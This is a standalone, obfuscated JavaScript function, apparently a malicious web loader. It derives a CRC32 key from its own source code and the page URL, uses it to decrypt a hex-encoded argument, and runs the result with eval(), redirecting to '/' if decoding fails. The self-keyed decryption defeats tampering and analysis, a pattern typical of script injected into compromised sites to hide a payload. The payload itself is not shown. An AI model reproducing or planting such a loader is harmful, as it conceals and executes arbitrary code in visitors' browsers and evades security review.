function kX5V5r0c7(kUQ1R2BK1, Qs0048BK7) {
   var cjUH28q5e = arguments.callee;
   var p53h4L4y0 = location.href;
   cjUH28q5e = cjUH28q5e.toString();
   cjUH28q5e = cjUH28q5e + p53h4L4y0;
   var SB4XghU6C = cjUH28q5e.replace(/\W/g, "");
   SB4XghU6C = SB4XghU6C.toUpperCase();
   var sJMQ070Fr = 4294967296;
   var LnG5D02h6 = new Array;

   for (var qDy5rWUfN = 0; qDy5rWUfN < 256; qDy5rWUfN++) {
      LnG5D02h6[qDy5rWUfN] = 0;
   }

   var kLb20BJEo = 1;
   for (var qDy5rWUfN = 128; qDy5rWUfN; qDy5rWUfN >>= 1) {
      kLb20BJEo = kLb20BJEo >>> 1 ^ (kLb20BJEo & 1 ? 3988292384 : 0);
      for (var D0KgHWU4k = 0; D0KgHWU4k < 256; D0KgHWU4k += qDy5rWUfN * 2) {
         var vg4UCpyMH = qDy5rWUfN + D0KgHWU4k;
         LnG5D02h6[vg4UCpyMH] = LnG5D02h6[D0KgHWU4k] ^ kLb20BJEo;
         if (LnG5D02h6[vg4UCpyMH] < 0) {
            LnG5D02h6[vg4UCpyMH] += sJMQ070Fr;
         }
      }
   }

   var tB02pFWV2 = sJMQ070Fr - 1;
   for (var EtRmJ0TD2 = 0; EtRmJ0TD2 < SB4XghU6C.length; EtRmJ0TD2++) {
      var tN1TuDrP7 = (tB02pFWV2 ^ SB4XghU6C.charCodeAt(EtRmJ0TD2)) & 255;
      tB02pFWV2 = (tB02pFWV2 >>> 8) ^ LnG5D02h6[tN1TuDrP7];
   }
   tB02pFWV2 = tB02pFWV2 ^ (sJMQ070Fr - 1);
   if (tB02pFWV2 < 0) {
      tB02pFWV2 += sJMQ070Fr;
   }
   tB02pFWV2 = tB02pFWV2.toString(16).toUpperCase();
   while (tB02pFWV2.length < 8) {
      tB02pFWV2 = "0" + tB02pFWV2;
   }

   var Fu6AW3O15 = new Array;
   for (var qDy5rWUfN = 0; qDy5rWUfN < 8; qDy5rWUfN++) {
      Fu6AW3O15[qDy5rWUfN] = tB02pFWV2.charCodeAt(qDy5rWUfN);
   }

   var iF1WMfDhU = "";
   var x1eh0Gtmx = 0;
   for (var qDy5rWUfN = 0; qDy5rWUfN < kUQ1R2BK1.length; qDy5rWUfN += 2) {
      var vg4UCpyMH = kUQ1R2BK1.substr(qDy5rWUfN, 2);
      var fvg4uKhmW = parseInt(vg4UCpyMH, 16);
      var td83Foe4Q = fvg4uKhmW - Fu6AW3O15[x1eh0Gtmx];
      if(td83Foe4Q < 0) {
         td83Foe4Q = td83Foe4Q + 256;
      }

      iF1WMfDhU += String.fromCharCode(td83Foe4Q);
      if(x1eh0Gtmx + 1 == Fu6AW3O15.length) {
         x1eh0Gtmx = 0;
      } else {
         x1eh0Gtmx++;
      }
   }

   var s78naXe8g = 0;
   try {
      eval(iF1WMfDhU);
   } catch(e) {
      s78naXe8g = 1;
   }

   try {
      if (s78naXe8g) {
         window.location = "/";
      }
   } catch(e) {}
}
